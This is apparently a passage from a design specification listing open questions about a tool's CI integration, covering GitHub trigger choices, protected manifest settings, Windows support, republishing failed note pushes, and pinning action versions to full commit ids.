**OPEN-2 · GitHub's untrusted trigger: `pull_request_target`, or a push dispatcher chained by `workflow_run`?** §7.1 specifies the first and states the cost — a PR per candidate. The second removes it and is the arrangement PB §7.4 rule 0 mentions first, but it rests on whether a `workflow_run`-triggered workflow can itself trigger a second `workflow_run` workflow, which this document could not verify. **Recommendation:** verify it against the provider before v1; if it chains, ship the dispatcher as the default and keep `pull_request_target` for repositories that already work through PRs. Owner-level because it changes the on-ramp every GitHub adopter meets.

**OPEN-3 · Whether `params.ci` is floor-relevant in G16's monotone sense.** *Also filed as `result-file.md` OPEN-7 and, since G14 and G16 were given their own document, as `manifest.md` OPEN-1 — which is the one that owns G16's check list (§6.2) and would carry the fix; the three are one question and must be decided once.* It is inside `.spine/**` and therefore floor-protected, so changing it takes a protected review. But changing it changes *which of §10.3's rows applies* — a repository moving from `github` to `gitlab` silently loses the one arrangement in which precondition 2 is reachable, under a review whose subject is a one-word manifest edit. **Recommendation:** treat it like PB §12's finding about `params.langs` — a change that shrinks a guarantee should look like one. Owner-level because it is a PB §6.7 and G16 change.

**OPEN-4 · A Windows CI target.** §5.5 refuses one. Supporting it needs a `.zip` container, an `.exe` suffix, a `uname` match for MSYS/MinGW/Cygwin, and an answer to PB §7.1's Windows agent-pipe residual. **Recommendation:** stay refused in v1 and say so in the docs rather than half-supporting it.

**OPEN-5 · A republish path for a failed note push.** §6.5 and §15 D18. Three ways out: a `--publish-note <landing-sha> --report <path>` flag; `--land` republishing idempotently when it meets an already-sealed landing whose note is missing and whose report it has been handed; or leaving it to GR §4.4.2's two commands over the CI artifact, which is where v1 stands. **Recommendation:** the second — it needs no new command against PB §10's four, and it is the only one that closes without a human remembering.

**OPEN-6 · Whether GitLab-with-an-external-control-project deserves its own `params.ci` value.** §8.1 routes it through `generic`, which is accurate — the definition is outside the repository — but it means a fully rule-0-compliant GitLab repository is labelled `generic` and inherits `generic`'s refusal of `merge.auto = on`, which it does not deserve. **Recommendation:** a `gitlab-external` value, or a `params.ci_verified` boolean the operator sets under a protected review and which precondition 2's third conjunct reads. Owner-level either way, and it is the only place in this document where the fail-closed answer is knowingly stricter than the arrangement warrants.

**OPEN-7 · Which action versions the release pins — the values, and only the values.** §3.3's three `PIN_` tokens. The versions themselves are a release decision; the *requirement* — full 40-hex commit ids, never tags, one per `actions.<k>.commit` in the release manifest, each beside the `repo` it belongs to (§3.4) — is not, and is normative here. Like OPEN-1, an unchosen value is a binary that renders no CI rather than one that renders a tag. **Recommendation:** pin, and re-pin only in a release, so that a repository's action set is as auditable as its spine binary.
